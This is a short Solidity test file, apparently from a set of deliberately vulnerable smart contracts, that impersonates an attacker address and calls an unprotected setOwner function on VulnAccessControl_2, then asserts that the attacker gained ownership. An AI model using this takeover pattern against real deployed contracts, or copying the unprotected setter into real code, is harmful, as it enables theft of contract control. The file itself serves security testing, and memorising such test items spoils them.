// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnAccessControl_2.sol";

interface Vm {
    function prank(address who) external;
}

contract VulnAccessControl_2Test {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnAccessControl_2 target;
    address attacker = address(0xBEEF);

    function setUp() public {
        target = new VulnAccessControl_2();
    }

    function testAccessControlExploit() public {
        vm.prank(attacker);
        target.setOwner(attacker);
        require(target.owner() == attacker, "Access control exploit confirmed: attacker acquired ownership");
    }
}
